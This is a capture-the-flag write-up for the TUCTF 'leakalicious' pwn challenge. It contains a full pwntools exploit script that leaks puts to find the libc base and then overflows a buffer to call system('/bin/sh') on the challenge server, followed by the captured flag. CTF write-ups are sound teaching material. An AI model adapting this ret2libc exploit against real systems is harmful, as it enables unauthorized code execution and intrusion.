# leakalicious

## PWN - Points: 500

> King Arthur has proposed this challenge for all those who consider themselves worthy.
>
> 
>
> nc chal.tuctf.com 30505
>
> [leakalicious](leakalicious)
>

Leak the address of `puts` and search for the correct `libc` version, e.g by using this website: https://libc.blukat.me/. Then calculate the offsets and overflow the buffer with `system` and `/bin/sh`.

Exploit script:

```python
from pwn import *

libc = ELF('libc6_2.29-0ubuntu2_i386.so')

# context.terminal = ['termite', '-e']
# p = gdb.debug('./leakalicious')
# p = process('leakalicious')
p = remote('chal.tuctf.com', 30505)

p.sendlineafter('> ', 'A' * 31)
print p.recvline()

libc_base = u32(p.recvline()[:-2]) - libc.symbols['puts']
print hex(libc_base)

sh = libc_base + libc.search("/bin/sh").next()

p.sendlineafter('> ', 'A')
p.sendlineafter('> ', 'A' * 44 + p32(libc_base+libc.symbols['system']) + p32(0x0) + p32(sh))
p.interactive()
```

flag: `TUCTF{cl0udy_w17h_4_ch4nc3_0f_l1bc}`